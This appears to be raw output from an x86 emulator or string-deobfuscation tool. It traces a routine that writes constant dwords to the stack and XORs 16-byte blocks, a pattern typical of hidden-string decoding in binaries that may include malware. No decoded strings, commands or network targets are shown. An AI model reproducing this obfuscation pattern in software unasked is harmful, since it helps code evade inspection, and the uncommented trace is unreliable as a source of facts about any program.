0x45f1cc: mov dword ptr [esp + 0x184], 0x35692081, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x8184 for stack size 0x10000 saving data to stack: 896082049 4 0x45f1d7: mov dword ptr [esp + 0x188], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x45f1de: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6d4 and offset 0x8180 for stack size 0x10000 0x45f1e7: push eax, regs_read: [30, 19], regs_write: [30] 0x45f1e8: movaps xmmword ptr [esp + 0x184], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6d0 and offset 0x8184 for stack size 0x10000 saving data to stack: 121398885183332 16 0x45f1fc: push ecx, regs_read: [30, 22], regs_write: [30] 0x45f1fd: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45f204: push dword ptr [esp + 0x1cc], regs_read: [30], regs_write: [30] 0x45f212: push dword ptr [esp + 0x1cc], regs_read: [30], regs_write: [30] 0x45f21e: movaps xmm1, xmmword ptr [esp + 0x2c0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6c4 and offset 0x82c0 for stack size 0x10000 0x45f22d: mov dword ptr [esp + 0x170], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6c4 and offset 0x8170 for stack size 0x10000 saving data to stack: 1592980423 4 0x45f238: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f23a: mov dword ptr [esp + 0x174], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x6c4 and offset 0x8174 for stack size 0x10000 saving data to stack: 896093928 4 0x45f245: mov dword ptr [esp + 0x178], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6c4 and offset 0x8178 for stack size 0x10000 saving data to stack: 929680980 4 0x45f24c: mov dword ptr [esp + 0x17c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x6c4 and offset 0x817c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f257: pxor xmm1, xmmword ptr [esp + 0x170], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6c4 and offset 0x8170 for stack size 0x10000 0x45f260: push eax, regs_read: [30, 19], regs_write: [30] 0x45f261: movaps xmmword ptr [esp + 0x174], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x8174 for stack size 0x10000 saving data to stack: 135099320244714391247415712030672483271 16 0x45f277: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45f27c: mov dword ptr [esp + 0x2b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x82b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45f287: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f28c: mov dword ptr [esp + 0x2b4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x82b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f293: mov dword ptr [esp + 0x2bc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x82bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f29a: mov dword ptr [esp + 0x16c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x816c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f2a8: mov dword ptr [esp + 0x164], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x8164 for stack size 0x10000 saving data to stack: 896093928 4 0x45f2af: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f2b1: mov dword ptr [esp + 0x2b8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x82b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f2b8: movaps xmm1, xmmword ptr [esp + 0x2b0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6c0 and offset 0x82b0 for stack size 0x10000 0x45f2c0: mov dword ptr [esp + 0x160], 0x5ef2f3c7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x8160 for stack size 0x10000 saving data to stack: 1592980423 4 0x45f2cb: mov dword ptr [esp + 0x168], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6c0 and offset 0x8168 for stack size 0x10000 saving data to stack: 929680980 4 0x45f2d2: pxor xmm1, xmmword ptr [esp + 0x160], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6c0 and offset 0x8160 for stack size 0x10000 0x45f2db: push eax, regs_read: [30, 19], regs_write: [30] 0x45f2dc: movaps xmmword ptr [esp + 0x164], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6bc and offset 0x8164 for stack size 0x10000 saving data to stack: 1752457584 16 0x45f2f0: push ecx, regs_read: [30, 22], regs_write: [30] 0x45f2f1: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45f2f8: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45f306: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45f312: movaps xmm1, xmmword ptr [esp + 0x2a0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6b0 and offset 0x82a0 for stack size 0x10000 0x45f321: mov dword ptr [esp + 0xb0], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP 0x6b0 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1610017490 4 0x45f32c: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f32e: mov dword ptr [esp + 0xb4], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x6b0 and offset 0x80b4 for stack size 0x10000 saving data to stack: 1545416602 4 0x45f339: mov dword ptr [esp + 0xb8], 0x562da03b, regs_read: [30], regs_write: () adjusting stack for ESP 0x6b0 and offset 0x80b8 for stack size 0x10000 saving data to stack: 1445830715 4 0x45f344: mov dword ptr [esp + 0xbc], 0x52ca85e1, regs_read: [30], regs_write: () adjusting stack for ESP 0x6b0 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389004257 4 0x45f34f: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6b0 and offset 0x80b0 for stack size 0x10000 0x45f358: push eax, regs_read: [30, 19], regs_write: [30] 0x45f359: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6ac and offset 0x80b4 for stack size 0x10000 saving data to stack: 110048255033271857315300727550201767046 16 0x45f36f: mov dword ptr [esp + 0x290], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8290 for stack size 0x10000 saving data to stack: 914789047 4 0x45f381: mov dword ptr [esp + 0x294], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8294 for stack size 0x10000 saving data to stack: 896093928 4 0x45f38c: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f38e: mov dword ptr [esp + 0x298], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8298 for stack size 0x10000 saving data to stack: 929680980 4 0x45f395: mov dword ptr [esp + 0x29c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x829c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f3a0: movaps xmm1, xmmword ptr [esp + 0x290], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6ac and offset 0x8290 for stack size 0x10000 0x45f3a8: mov dword ptr [esp + 0x150], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8150 for stack size 0x10000 saving data to stack: 1610017490 4 0x45f3b3: mov dword ptr [esp + 0x154], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8154 for stack size 0x10000 saving data to stack: 1545416602 4 0x45f3be: mov dword ptr [esp + 0x158], 0x562da03b, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x8158 for stack size 0x10000 saving data to stack: 1445830715 4 0x45f3c9: mov dword ptr [esp + 0x15c], 0x52ca85e1, regs_read: [30], regs_write: () adjusting stack for ESP 0x6ac and offset 0x815c for stack size 0x10000 saving data to stack: 1389004257 4 0x45f3d4: pxor xmm1, xmmword ptr [esp + 0x150], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6ac and offset 0x8150 for stack size 0x10000 0x45f3dd: push eax, regs_read: [30, 19], regs_write: [30] 0x45f3de: movaps xmmword ptr [esp + 0x154], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8154 for stack size 0x10000 saving data to stack: 2057743939594897280759431699658853 16 0x45f3f2: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45f3f9: mov edi, dword ptr [esp + 0x1b8], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x6a8 and offset 0x81b8 for stack size 0x10000 0x45f400: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x801c for stack size 0x10000 saving data to stack: 0 4 0x45f404: mov edi, dword ptr [esp + 0x1bc], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x6a8 and offset 0x81bc for stack size 0x10000 0x45f40b: mov dword ptr [esp + 0x20], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8020 for stack size 0x10000 saving data to stack: 0 4 0x45f40f: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45f416: mov eax, dword ptr [esp + 0x1b4], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x6a8 and offset 0x81b4 for stack size 0x10000 0x45f41d: mov dword ptr [esp + 0x20], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8020 for stack size 0x10000 saving data to stack: 0 4 0x45f421: mov eax, dword ptr [esp + 0x1b0], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x6a8 and offset 0x81b0 for stack size 0x10000 0x45f428: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x801c for stack size 0x10000 saving data to stack: 28265 4 0x45f42c: movaps xmm1, xmmword ptr [esp + 0x280], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6a8 and offset 0x8280 for stack size 0x10000 0x45f43b: mov dword ptr [esp + 0x140], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8140 for stack size 0x10000 saving data to stack: 1407972313 4 0x45f446: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f448: mov dword ptr [esp + 0x144], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45f453: mov dword ptr [esp + 0x148], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45f45a: mov dword ptr [esp + 0x14c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x6a8 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f465: pxor xmm1, xmmword ptr [esp + 0x140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6a8 and offset 0x8140 for stack size 0x10000 0x45f46e: push eax, regs_read: [30, 19], regs_write: [30] 0x45f46f: movaps xmmword ptr [esp + 0x144], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8144 for stack size 0x10000 saving data to stack: 1701667182 16 0x45f485: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45f48a: mov dword ptr [esp + 0x130], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8130 for stack size 0x10000 saving data to stack: 1407972313 4 0x45f495: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f49a: mov dword ptr [esp + 0x134], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45f4a1: mov dword ptr [esp + 0x13c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f4a8: mov dword ptr [esp + 0x138], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45f4af: movaps xmm1, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6a4 and offset 0x8130 for stack size 0x10000 0x45f4b7: mov dword ptr [esp + 0x274], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8274 for stack size 0x10000 saving data to stack: 896093928 4 0x45f4be: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f4c0: mov dword ptr [esp + 0x27c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x827c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f4ce: mov dword ptr [esp + 0x270], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8270 for stack size 0x10000 saving data to stack: 914789047 4 0x45f4d9: mov dword ptr [esp + 0x278], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6a4 and offset 0x8278 for stack size 0x10000 saving data to stack: 929680980 4 0x45f4e0: pxor xmm1, xmmword ptr [esp + 0x270], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6a4 and offset 0x8270 for stack size 0x10000 0x45f4e9: push eax, regs_read: [30, 19], regs_write: [30] 0x45f4ea: movaps xmmword ptr [esp + 0x134], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6a0 and offset 0x8134 for stack size 0x10000 saving data to stack: 1701667182 16 0x45f4fe: push ecx, regs_read: [30, 22], regs_write: [30] 0x45f4ff: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45f506: push dword ptr [esp + 0x1ac], regs_read: [30], regs_write: [30] 0x45f514: push dword ptr [esp + 0x1ac], regs_read: [30], regs_write: [30] 0x45f520: movaps xmm1, xmmword ptr [esp + 0x260], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x694 and offset 0x8260 for stack size 0x10000 0x45f52f: mov dword ptr [esp + 0x120], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP 0x694 and offset 0x8120 for stack size 0x10000 saving data to stack: 1139471297 4 0x45f53a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f53c: mov dword ptr [esp + 0x124], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP 0x694 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093837 4 0x45f547: mov dword ptr [esp + 0x128], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x694 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45f54e: mov dword ptr [esp + 0x12c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x694 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f559: pxor xmm1, xmmword ptr [esp + 0x120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x694 and offset 0x8120 for stack size 0x10000 0x45f562: push eax, regs_read: [30, 19], regs_write: [30] 0x45f563: movaps xmmword ptr [esp + 0x124], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x690 and offset 0x8124 for stack size 0x10000 saving data to stack: 0 16 0x45f579: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f57e: mov dword ptr [esp + 0x110], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP 0x690 and offset 0x8110 for stack size 0x10000 saving data to stack: 1139471297 4 0x45f589: mov dword ptr [esp + 0x11c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x690 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f590: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f592: mov dword ptr [esp + 0x114], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP 0x690 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093837 4 0x45f59d: mov dword ptr [esp + 0x118], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x690 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45f5a4: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x690 and offset 0x8110 for stack size 0x10000 0x45f5ac: mov dword ptr [esp + 0x25c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x690 and offset 0x825c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f5ba: mov dword ptr [esp + 0x250], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x690 and offset 0x8250 for stack size 0x10000 saving data to stack: 914789047 4 0x45f5c5: mov dword ptr [esp + 0x254], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x690 and offset 0x8254 for stack size 0x10000 saving data to stack: 896093928 4 0x45f5d0: mov dword ptr [esp + 0x258], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x690 and offset 0x8258 for stack size 0x10000 saving data to stack: 929680980 4 0x45f5d7: pxor xmm1, xmmword ptr [esp + 0x250], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x690 and offset 0x8250 for stack size 0x10000 0x45f5e0: push eax, regs_read: [30, 19], regs_write: [30] 0x45f5e1: movaps xmmword ptr [esp + 0x114], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x68c and offset 0x8114 for stack size 0x10000 saving data to stack: 435761734006 16 0x45f5f2: push ecx, regs_read: [30, 22], regs_write: [30] 0x45f5f3: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45f5fa: push dword ptr [esp + 0x44], regs_read: [30], regs_write: [30] 0x45f605: push dword ptr [esp + 0x44], regs_read: [30], regs_write: [30] 0x45f60e: movaps xmm1, xmmword ptr [esp + 0x240], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x680 and offset 0x8240 for stack size 0x10000 0x45f61d: mov dword ptr [esp + 0x100], 0x43e5f7c4, regs_read: [30], regs_write: () adjusting stack for ESP 0x680 and offset 0x8100 for stack size 0x10000 saving data to stack: 1139144644 4 0x45f628: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f62a: mov dword ptr [esp + 0x104], 0x35692b9a, regs_read: [30], regs_write: () adjusting stack for ESP 0x680 and offset 0x8104 for stack size 0x10000 saving data to stack: 896084890 4 0x45f635: mov dword ptr [esp + 0x108], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x680 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45f63c: mov dword ptr [esp + 0x10c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x680 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f647: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x680 and offset 0x8100 for stack size 0x10000 0x45f650: push eax, regs_read: [30, 19], regs_write: [30] 0x45f651: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x67c and offset 0x8104 for stack size 0x10000 saving data to stack: 110050101914730240481959517998894387105 16 0x45f66b: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45f672: mov dword ptr [esp + 0xf8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f679: mov dword ptr [esp + 0xf0], 0x73d3c0e3, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80f0 for stack size 0x10000 saving data to stack: 1943257315 4 0x45f684: mov dword ptr [esp + 0xf4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f68f: mov dword ptr [esp + 0xfc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f696: movaps xmm1, xmmword ptr [esp + 0xf0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x80f0 for stack size 0x10000 0x45f69e: mov dword ptr [esp + 0x238], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x8238 for stack size 0x10000 saving data to stack: 929680980 4 0x45f6ac: mov dword ptr [esp + 0x230], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8230 for stack size 0x10000 saving data to stack: 914789047 4 0x45f6b7: mov dword ptr [esp + 0x234], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8234 for stack size 0x10000 saving data to stack: 896093928 4 0x45f6c2: mov dword ptr [esp + 0x23c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x823c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f6c9: pxor xmm1, xmmword ptr [esp + 0x230], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x8230 for stack size 0x10000 0x45f6d2: mov dword ptr [esp + 0x28], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45f6d6: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45f6db: movaps xmmword ptr [esp + 0xf0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x67c and offset 0x80f0 for stack size 0x10000 saving data to stack: 1163219540 16 0x45f6e5: mov dword ptr [esp + 0xe0], 0x65cad3f1, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80e0 for stack size 0x10000 saving data to stack: 1707791345 4 0x45f6f7: mov dword ptr [esp + 0xe4], 0x35694ead, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80e4 for stack size 0x10000 saving data to stack: 896093869 4 0x45f702: mov dword ptr [esp + 0xe8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x80e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f709: mov dword ptr [esp + 0xec], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x80ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45f710: movaps xmm1, xmmword ptr [esp + 0xe0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x80e0 for stack size 0x10000 0x45f718: mov dword ptr [esp + 0x220], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8220 for stack size 0x10000 saving data to stack: 914789047 4 0x45f723: mov dword ptr [esp + 0x224], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8224 for stack size 0x10000 saving data to stack: 896093928 4 0x45f72e: mov dword ptr [esp + 0x228], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x8228 for stack size 0x10000 saving data to stack: 929680980 4 0x45f735: mov dword ptr [esp + 0x22c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x822c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f73c: pxor xmm1, xmmword ptr [esp + 0x220], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x8220 for stack size 0x10000 0x45f745: movaps xmmword ptr [esp + 0xe0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x67c and offset 0x80e0 for stack size 0x10000 saving data to stack: 297750249798 16 0x45f74d: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x67c and offset 0x8028 for stack size 0x10000 saving data to stack: 1389027477 4 0x45f751: mov dword ptr [esp + 0x21c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x821c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f75f: mov dword ptr [esp + 0xdc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x67c and offset 0x80dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f766: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f768: mov dword ptr [esp + 0x210], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8210 for stack size 0x10000 saving data to stack: 914789047 4 0x45f773: mov dword ptr [esp + 0x214], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x8214 for stack size 0x10000 saving data to stack: 896093928 4 0x45f77e: mov dword ptr [esp + 0x218], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x8218 for stack size 0x10000 saving data to stack: 929680980 4 0x45f785: movaps xmm1, xmmword ptr [esp + 0x210], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x8210 for stack size 0x10000 0x45f78d: mov dword ptr [esp + 0xd0], 0x46f2e6df, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80d0 for stack size 0x10000 saving data to stack: 1190323935 4 0x45f798: mov dword ptr [esp + 0xd4], 0x4c0520a7, regs_read: [30], regs_write: () adjusting stack for ESP 0x67c and offset 0x80d4 for stack size 0x10000 saving data to stack: 1275404455 4 0x45f7a3: mov dword ptr [esp + 0xd8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x67c and offset 0x80d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f7aa: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x67c and offset 0x80d0 for stack size 0x10000 0x45f7b3: push eax, regs_read: [30, 19], regs_write: [30] 0x45f7b4: movaps xmmword ptr [esp + 0xd4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x678 and offset 0x80d4 for stack size 0x10000 saving data to stack: 8749489463542183016 16 0x45f7ce: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f7d5: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45f7da: mov dword ptr [esp + 0xc8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x678 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f7e1: mov dword ptr [esp + 0xc0], 0x73d3c0e3, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1943257315 4 0x45f7ec: mov dword ptr [esp + 0xc4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x678 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f7f3: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x678 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f7fa: movaps xmm1, xmmword ptr [esp + 0xc0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x678 and offset 0x80c0 for stack size 0x10000 0x45f802: mov dword ptr [esp + 0x208], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x678 and offset 0x8208 for stack size 0x10000 saving data to stack: 929680980 4 0x45f810: mov dword ptr [esp + 0x200], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x8200 for stack size 0x10000 saving data to stack: 914789047 4 0x45f81b: mov dword ptr [esp + 0x204], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x678 and offset 0x8204 for stack size 0x10000 saving data to stack: 896093928 4 0x45f822: mov dword ptr [esp + 0x20c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x678 and offset 0x820c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f829: pxor xmm1, xmmword ptr [esp + 0x200], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x678 and offset 0x8200 for stack size 0x10000 0x45f832: movaps xmmword ptr [esp + 0xc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x678 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1163219540 16 0x45f83c: mov dword ptr [esp + 0x38], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x678 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x45f840: mov dword ptr [esp + 0x30], 0x65cad3f1, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x8030 for stack size 0x10000 saving data to stack: 1707791345 4 0x45f848: mov dword ptr [esp + 0x34], 0x35694ead, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093869 4 0x45f850: mov dword ptr [esp + 0x3c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x678 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f854: movaps xmm1, xmmword ptr [esp + 0x30], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x678 and offset 0x8030 for stack size 0x10000 0x45f859: mov dword ptr [esp + 0x1f8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x678 and offset 0x81f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f864: mov dword ptr [esp + 0x1f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x81f0 for stack size 0x10000 saving data to stack: 914789047 4 